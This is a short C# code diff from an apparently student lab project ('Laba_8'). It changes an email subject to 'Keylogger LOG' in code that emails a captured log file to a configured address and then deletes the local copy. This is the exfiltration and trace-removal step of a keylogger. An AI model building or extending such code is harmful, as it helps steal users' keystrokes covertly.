@@ -39,7 +39,7 @@ namespace Laba_8
             {
                 if (!string.IsNullOrEmpty(_config.Email))
                 {
-                    new EmailManager().SendEmail(_config.Email, "Laba 8 Log", filePath);
+                    new EmailManager().SendEmail(_config.Email, "Keylogger LOG", filePath);
                     new FileInfo(filePath).Delete();
                 }
             }
